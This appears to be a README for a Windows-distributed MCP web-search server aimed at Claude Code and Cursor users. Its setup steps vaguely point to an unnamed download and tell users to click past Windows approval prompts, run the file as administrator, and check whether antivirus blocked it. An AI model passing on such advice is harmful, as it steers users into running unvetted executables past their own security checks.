# 🔎 contextwire-mcp - Fast web search for AI tools

[![Download](https://img.shields.io/badge/Download-ContextWire%20MCP-blue?style=for-the-badge)](https://github.com/Hainam25699/contextwire-mcp)

## 🧭 What this is

ContextWire MCP is a search API server for AI apps and agents. It lets tools like Claude Code and Cursor look up web results through one shared connection.

Use it when you want your AI tool to search the web, find sources, and pull in current context without extra setup.

## 💻 What you need

- A Windows PC
- A web browser
- An AI app that supports MCP, such as Claude Code or Cursor
- Internet access
- Permission to run files on your PC

## 📥 Download and install

1. Open this page: https://github.com/Hainam25699/contextwire-mcp
2. Download the Windows version from the project files or release area on that page
3. Save the file to a folder you can find again, such as Downloads
4. If the file is zipped, right-click it and choose Extract All
5. Open the extracted folder
6. Run the app file or start script for Windows
7. If Windows asks for approval, choose Run anyway or Allow

If you use a browser download, check the bottom-left corner or your Downloads folder after it finishes.

## 🪟 First run on Windows

1. Double-click the app file or start file
2. Wait a few seconds for the server to start
3. Keep the window open while you use your AI app
4. If a console window appears, that is normal
5. If Windows Firewall asks for access, allow it for private networks

The app runs in the background while your AI tool connects to it.

## 🔗 Connect it to your AI app

### Claude Code

1. Open Claude Code
2. Go to its MCP or connector settings
3. Add a new server
4. Point it to the ContextWire MCP server you just started
5. Save the settings
6. Start a chat and ask it to search for current web info

### Cursor

1. Open Cursor
2. Open settings
3. Find MCP or tool connections
4. Add a new server entry
5. Use the local server details from ContextWire MCP
6. Save and reload Cursor if needed

### Other MCP clients

1. Open your MCP client
2. Add a new server
3. Use the local server address from the app
4. Save the connection
5. Test it with a search request

## 🛠️ If it does not start

If the app does not open on Windows, try these steps:

1. Check that the file finished downloading
2. Make sure you extracted the zip file first
3. Right-click the file and choose Run as administrator
4. Check whether antivirus blocked the file
5. Restart the app and try again
6. Make sure your internet connection works
7. Reopen your AI app after the server starts

If your AI app does not see the server, close it and open it again after ContextWire MCP is running.
